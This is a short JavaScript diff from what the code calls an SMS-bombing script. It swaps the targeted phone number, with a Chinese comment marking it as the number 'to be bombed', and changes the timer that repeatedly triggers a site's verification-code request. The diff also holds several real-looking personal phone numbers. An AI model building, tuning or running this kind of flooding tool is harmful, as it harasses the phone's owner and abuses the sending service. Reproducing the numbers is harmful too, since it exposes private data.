@@ -38,9 +38,7 @@ var handleYsale = function(){
 
 		if(text.length == 4){
 			param.vcode = text;
-			//param.phone = 17760040527;
-			param.phone = 13105625814;
-			//param.phone = 15882875043;
+			param.phone = 18345154111;	//需要轰炸的手机号码
 			param.act = "recvphone";
 			handle();
 		}
@@ -70,5 +68,5 @@ var handleYsale = function(){
 
 };
 
-setInterval(handleYsale().init,2000);
+setInterval(handleYsale().init,3000);
 
